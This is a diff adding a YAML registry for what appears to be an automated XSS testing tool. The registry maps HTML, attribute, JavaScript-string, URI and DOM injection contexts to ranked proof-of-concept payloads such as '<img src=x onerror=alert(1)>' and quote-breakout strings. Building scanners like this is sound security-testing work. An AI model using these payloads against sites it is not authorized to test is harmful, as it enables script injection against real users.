@@ -1,0 +1,134 @@
+# XSS Test Strategy Registry
+# Maps context → ranked payload families.
+# The planner uses this deterministically before calling the LLM.
+#
+# Each strategy has:
+#   context_ids: which context(s) this applies to
+#   payloads: ordered list, each with a category and examples
+#   max_http_attempts: how many to try via HTTP before needing browser
+#   notes: guidance for the planner
+
+strategies:
+
+  - id: tag_injection
+    label: "HTML tag injection"
+    context_ids: [html_text]
+    max_http_attempts: 4
+    payloads:
+      - category: event_handler
+        examples:
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+          - "<body onload=alert(1)>"
+      - category: script_tag
+        examples:
+          - "<script>alert(1)</script>"
+      - category: frame_injection
+        examples:
+          - "<iframe src=javascript:alert(1)>"
+
+  - id: attribute_breakout
+    label: "Attribute value breakout"
+    context_ids: [html_attribute, html_attribute_unquoted]
+    max_http_attempts: 5
+    payloads:
+      - category: double_quote_event
+        examples:
+          - '" onmouseover="alert(1)'
+          - '" onfocus="alert(1)" autofocus="'
+          - '" onmouseenter="alert(1)'
+          - '" tabindex="1" onfocus="alert(1)'
+      - category: single_quote_event
+        examples:
+          - "' onmouseover='alert(1)'"
+          - "' onfocus='alert(1)' autofocus='"
+      - category: close_and_inject
+        examples:
+          - '"><img src=x onerror=alert(1)>'
+          - "'><svg onload=alert(1)>"
+      - category: javascript_uri
+        examples:
+          - "javascript:alert(1)"
+        note: "Only for href/src/action attributes"
+
+  - id: js_string_breakout
+    label: "JavaScript string breakout"
+    context_ids: [script_string_double, script_string_single, script_string_template]
+    max_http_attempts: 3
+    payloads:
+      - category: arithmetic_breakout
+        examples:
+          - '"-alert(1)-"'
+          - "'-alert(1)-'"
+      - category: statement_injection
+        examples:
+          - '";alert(1)//'
+          - "';alert(1)//"
+      - category: template_injection
+        examples:
+          - "${alert(1)}"
+        note: "Only for template literals"
+
+  - id: js_expression_injection
+    label: "JavaScript expression injection"
+    context_ids: [script_expression]
+    max_http_attempts: 2
+    payloads:
+      - category: statement
+        examples:
+          - ";alert(1)//"
+          - "alert(1)"
+
+  - id: javascript_uri
+    label: "javascript: URI injection"
+    context_ids: [url_param]
+    max_http_attempts: 1
+    payloads:
+      - category: js_scheme
+        examples:
+          - "javascript:alert(1)"
+          - "javascript:alert(document.domain)"
+
+  - id: dom_specific
+    label: "DOM XSS — hash/query source"
+    context_ids: [dom]
+    max_http_attempts: 0
+    notes: "Requires browser — HTTP testing cannot verify DOM execution"
+    payloads:
+      - category: hash_injection
+        source_type: hash
+        examples:
+          - "#<img src=x onerror=alert(1)>"
+          - "#<svg onload=alert(1)>"
+          - "#<script>alert(1)</script>"
+          - "#<iframe onload=alert(1)>"
+      - category: query_injection
+        source_type: query
+        examples:
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+      - category: angular_bypass
+        source_type: api_response
+        examples:
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+          - '<iframe src="javascript:alert(1)">'
+
+  - id: none_http_only
+    label: "JSON / non-HTML context — no HTTP-only test possible"
+    context_ids: [json_value, json_key, unknown]
+    max_http_attempts: 0
+    notes: >
+      JSON reflections and unknown contexts cannot be verified via HTTP alone.
+      A Manual Test is generated instead.
+
+  - id: generic_probe
+    label: "Generic context probe"
+    context_ids: [unknown]
+    max_http_attempts: 2
+    payloads:
+      - category: generic
+        examples:
+          - '" onmouseover="alert(1)'
+          - "<img src=x onerror=alert(1)>"
+          - "javascript:alert(1)"
